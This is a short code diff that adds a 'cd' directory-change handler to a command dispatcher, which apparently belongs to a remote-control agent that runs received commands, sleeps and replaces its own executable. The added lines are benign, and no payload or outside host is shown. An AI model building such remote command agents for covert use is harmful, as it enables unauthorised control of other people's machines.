@@ -14275,6 +14275,18 @@ def on_command(data):
             output += "2. Verify signature\n"
             output += "3. Replace current executable\n"
             output += "4. Restart with new version"
+        elif isinstance(command, str) and command.lower().startswith("cd "):
+            try:
+                path = command[3:].strip()
+                if len(path) == 1 and path.isalpha():
+                    path = f"{path}:\\"
+                elif len(path) == 2 and path[1] == ":" and path[0].isalpha():
+                    path = f"{path}\\"
+                path = os.path.expanduser(path)
+                os.chdir(path)
+                output = f"Changed directory to: {os.getcwd()}"
+            except Exception as e:
+                output = f"cd error: {str(e)}"
         elif command != "sleep":
             output = execute_command(command)
         
